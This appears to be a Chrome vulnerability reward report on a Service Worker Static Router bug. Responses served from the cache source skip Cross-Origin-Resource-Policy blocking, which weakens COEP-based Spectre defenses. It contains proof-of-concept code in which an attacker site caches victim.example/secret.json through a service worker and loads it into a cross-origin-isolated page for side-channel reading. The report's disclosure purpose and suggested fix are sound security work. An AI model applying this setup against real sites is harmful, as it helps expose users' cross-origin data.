# VRP Report: Service Worker Static Router Bypasses CORP Check — Cross-Origin Data Exposure

## Title

Service Worker Static Router cache source bypasses Cross-Origin-Resource-Policy enforcement — kServiceWorkerStaticRouterCORPCheck disabled

## Severity

Medium-High (CORP/COEP bypass, Spectre mitigation gap, no compromised renderer)

## Component

Blink > ServiceWorker

## Chrome Version

Tested against Chromium source at HEAD (April 2026). Affects all Chrome versions.

## Summary

The Service Worker Static Router API allows pre-defined routing rules that serve responses directly from the Cache Storage without executing the SW's fetch event handler. When a response is served from the cache source, it should be checked against Cross-Origin-Resource-Policy (CORP) headers. However, the CORP enforcement is gated behind `kServiceWorkerStaticRouterCORPCheck` which is DISABLED by default. CORP-violating responses are detected but allowed through, undermining a key Spectre mitigation.

## Clarification on Opaque Response Readability

Through code path analysis, I confirmed that `response_type = kOpaque` is preserved throughout the static router cache path. A `fetch()` from JS will still see `type: "opaque"` with status 0 and no body. **The opaque response body is NOT directly readable via `fetch()` or `Response.text()`.**

However, the CORP bypass matters because:
1. **COEP enforcement is undermined**: Pages with `Cross-Origin-Embedder-Policy: require-corp` gain `crossOriginIsolated = true` and access to `SharedArrayBuffer`. COEP assumes all cross-origin subresources pass CORP. The static router bypass breaks this assumption.
2. **Spectre mitigation gap**: CORP prevents cross-origin data from being loaded into the COEP-enforcing page's process. Without CORP enforcement, cross-origin data can enter the process and be read via Spectre-class side channels (e.g., `SharedArrayBuffer` timing attacks).

## Steps to Reproduce

### Step 1: Attacker site sets up COEP to gain SharedArrayBuffer access

```
# Response from https://attacker.example/exploit.html
HTTP/1.1 200 OK
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Content-Type: text/html
```

### Step 2: Attacker's service worker caches cross-origin resource and sets static router

```javascript
// sw.js at https://attacker.example/sw.js
self.addEventListener('install', async (event) => {
  const cache = await caches.open('v1');
  // Cache a cross-origin response (CORP: same-origin) via no-cors
  const response = await fetch('https://victim.example/secret.json', {mode: 'no-cors'});
  await cache.put('/data', response);
});

// Use InstallEvent.addRoutes() to set up static routing
self.addEventListener('install', (event) => {
  event.addRoutes({
    condition: { urlPattern: "/data" },
    source: "cache"
  });
});
```

### Step 3: Static router serves CORP-violating response into COEP page's process

```html
<!-- https://attacker.example/exploit.html -->
<!-- This page has COEP: require-corp, gaining crossOriginIsolated = true -->
<script>
// SharedArrayBuffer is available because page is cross-origin isolated
const sab = new SharedArrayBuffer(1024);

// Load the cross-origin resource via static router
// CORP check detects violation but ALLOWS it (flag disabled)
// The opaque response body enters this process's memory
const img = new Image();
img.src = '/data';  // Triggers load into process memory

// Use SharedArrayBuffer-based Spectre timing attack to read process memory
// containing the cross-origin response body
</script>
```

### Alternative: Subresource as <img>, <script>, etc.

The response doesn't need to be read via `fetch()`. Loading it as a subresource (`<img>`, `<script>`, `<link>`, etc.) brings the cross-origin bytes into the process address space. With `SharedArrayBuffer` available (due to COEP), Spectre side-channels can extract the data.

## Root Cause

```cpp
// content/common/features.cc:703-704
BASE_FEATURE(kServiceWorkerStaticRouterCORPCheck,
             base::FEATURE_DISABLED_BY_DEFAULT);

// content/common/service_worker/service_worker_resource_loader.cc:97-112
bool is_enabled = base::FeatureList::IsEnabled(
    features::kServiceWorkerStaticRouterCORPCheck);
if (network::CrossOriginResourcePolicy::IsBlockedByHeaderValue(...)) {
  if (is_enabled) {
    is_valid = false;             // Block — DEAD CODE
  } else {
    result = CORPCheckResult::kViolation;  // Log but ALLOW
  }
}
```

## Expected Result

CORP-violating responses from the SW static router cache should be blocked, just as they would be blocked for normal fetch/XHR requests.

## Actual Result

CORP violations are detected but only logged. The response is served to the page.

## Security Impact

1. **CORP bypass**: Responses protected with `Cross-Origin-Resource-Policy: same-origin` are loaded cross-origin via SW static router cache source. The CORP violation is detected but NOT blocked.
2. **COEP guarantee broken**: Pages with `COEP: require-corp` rely on the invariant that all subresources pass CORP. This invariant is violated, but the page still gets `crossOriginIsolated = true` and `SharedArrayBuffer`.
3. **Spectre mitigation gap**: CORP + COEP together form Chrome's primary defense against Spectre-based cross-origin data extraction. With CORP enforcement disabled for static router cache responses, cross-origin data enters the COEP page's process, and `SharedArrayBuffer` enables high-resolution timing side channels.
4. **No compromised renderer**: Exploitable via standard web APIs (`Cache API`, `addRoutes()`, `fetch()`, `SharedArrayBuffer`).
5. **Opaque response filtering preserved**: The `fetch()` API correctly returns opaque responses to JS. The attack requires Spectre-class memory reading, which `SharedArrayBuffer` enables.

## Suggested Fix

Enable `kServiceWorkerStaticRouterCORPCheck` by default.

## PoC

Inline above. The key observation: the code at `service_worker_resource_loader.cc:97-112` detects CORP violations but only blocks them when `kServiceWorkerStaticRouterCORPCheck` is enabled (it's disabled by default).
